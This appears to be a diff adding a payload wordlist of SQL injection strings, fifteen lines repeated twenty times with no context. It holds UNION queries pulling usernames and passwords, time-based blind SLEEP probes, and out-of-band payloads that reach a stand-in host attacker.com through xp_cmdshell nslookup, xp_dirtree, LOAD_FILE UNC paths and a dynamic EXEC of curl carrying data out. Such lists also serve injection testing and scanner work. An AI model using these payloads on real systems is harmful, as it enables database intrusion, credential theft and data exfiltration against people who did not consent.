@@ -1,0 +1,300 @@
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+' UNION SELECT username, password FROM users WHERE '1'='1'--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--
+' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--
+' AND IF(1=1,SLEEP(5),0)--
+' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--
+' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+'; EXEC master..xp_dirtree '\\attacker.com\leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
